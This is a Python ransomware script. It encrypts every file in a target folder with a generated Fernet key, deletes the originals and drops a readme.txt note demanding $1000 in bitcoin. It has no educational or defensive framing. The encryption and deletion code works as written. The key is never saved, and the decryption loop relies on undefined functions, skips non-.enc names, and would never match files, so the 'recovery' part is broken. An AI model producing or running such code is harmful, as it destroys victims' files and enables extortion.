import os
from cryptography.fernet import Fernet

# The key that will be used for encryption and decryption
key = Fernet.generate_key()

# The ransom note message that will be displayed to the victim
message = 'Your files have been encrypted! To get the decryption key, pay us $1000 in bitcoin to this address: xxxxxxxx'

# The folder containing the files to encrypt
folder_path = '/path/to/folder/'

# Get a list of all the files in the folder
file_list = os.listdir(folder_path)

# Loop through all the files and encrypt them
for file_name in file_list:
    # Ignore directories and non-plaintext files
    if os.path.isdir(file_name) or file_name.endswith('.enc'):
        continue
    
    # Read the plaintext file
    with open(os.path.join(folder_path, file_name), 'rb') as f:
        plaintext = f.read()
    
    # Encrypt the plaintext file
    fernet = Fernet(key)
    ciphertext = fernet.encrypt(plaintext)
    
    # Write the encrypted file to disk
    with open(os.path.join(folder_path, file_name + '.enc'), 'wb') as f:
        f.write(ciphertext)
    
    # Delete the plaintext file
    os.remove(os.path.join(folder_path, file_name))

# Write the ransom note to a file
with open(os.path.join(folder_path, 'readme.txt'), 'w') as f:
    f.write(message)

# Wait for payment and decryption key
while True:
    if payment_received():
        key = get_key_from_payment()
        fernet = Fernet(key)
        
        # Loop through all the files and decrypt them
        for file_name in file_list:
            if file_name.endswith('.enc'):
                # Read the encrypted file
                with open(os.path.join(folder_path, file_name), 'rb') as f:
                    ciphertext = f.read()
                
                # Decrypt the file
                plaintext = fernet.decrypt(ciphertext)
                
                # Write the decrypted file to disk
                with open(os.path.join(folder_path, file_name[:-4]), 'wb') as f:
                    f.write(plaintext)
                
                # Delete the encrypted file
                os.remove(os.path.join(folder_path, file_name))
        
        break
